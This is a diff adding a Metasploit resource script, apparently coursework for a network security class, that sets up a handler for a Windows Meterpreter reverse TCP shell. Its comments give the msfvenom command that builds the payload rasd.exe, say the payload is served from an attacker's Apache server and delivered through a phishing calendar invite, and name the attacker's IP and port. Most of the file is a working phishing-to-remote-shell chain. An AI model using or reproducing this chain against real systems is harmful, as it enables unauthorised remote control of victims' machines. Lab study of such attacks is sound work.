@@ -1,0 +1,33 @@
+# =============================================================================
+# metasploit_handler.rc
+# Metasploit Framework Resource Script — Reverse TCP Handler
+# CSE804: Network and Internet Security — Task 2
+#
+# USAGE (from Kali terminal):
+#   msfconsole -r configs/metasploit_handler.rc
+#
+# This sets up a multi/handler to catch the reverse shell connection
+# once the victim executes rasd.exe from the phishing calendar invite.
+#
+# Before running:
+#   1. Set LHOST to your attacker Kali IP (default: 10.33.3.49)
+#   2. Ensure rasd.exe was generated with:
+#      msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.33.3.49 LPORT=4444 -f exe > rasd.exe
+#   3. Ensure Apache is serving rasd.exe at http://10.33.3.49/rasd.exe
+# =============================================================================
+
+use exploit/multi/handler
+
+set payload windows/meterpreter/reverse_tcp
+
+# Set to attacker machine IP
+set LHOST 10.33.3.49
+
+# Must match LPORT used during msfvenom payload generation
+set LPORT 4444
+
+# Print session info on connect
+set ExitOnSession false
+
+# Run the handler
+exploit -j
